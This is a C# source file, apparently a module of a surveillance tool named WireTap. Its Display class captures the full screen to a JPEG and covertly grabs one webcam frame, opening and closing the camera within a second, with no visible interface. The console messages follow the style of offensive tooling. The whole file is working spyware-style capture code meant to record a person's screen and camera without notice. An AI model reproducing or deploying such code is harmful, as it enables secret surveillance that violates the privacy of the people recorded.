using System;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using AForge.Video.DirectShow;
using AForge.Video;
using System.Threading;
//using WPF_Webcam;

namespace WireTap
{
    class Display
    {
        private static string captureFile = "";
        private static VideoCaptureDevice videoSource;
        public static void CaptureImage(string outFile)
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            try
            {
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }
                    bitmap.Save(outFile, ImageFormat.Jpeg);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Error: {0}", ex);
            }
        }

        public static void CaptureWebcam(string outFile)
        {
            captureFile = outFile;
            var videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
            videoSource.NewFrame += new NewFrameEventHandler(video_NewFrame);
            videoSource.Start();
            Thread.Sleep(1000);
            videoSource.SignalToStop();
        }

        private static void video_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            // get new frame
            Bitmap bitmap = eventArgs.Frame;
            bitmap.Save(captureFile, ImageFormat.Jpeg);
            Console.WriteLine("[+] Saved WebCam screenshot to: {0}", captureFile);
            captureFile = "";
            videoSource.NewFrame -= new NewFrameEventHandler(video_NewFrame);
        }
    }
}
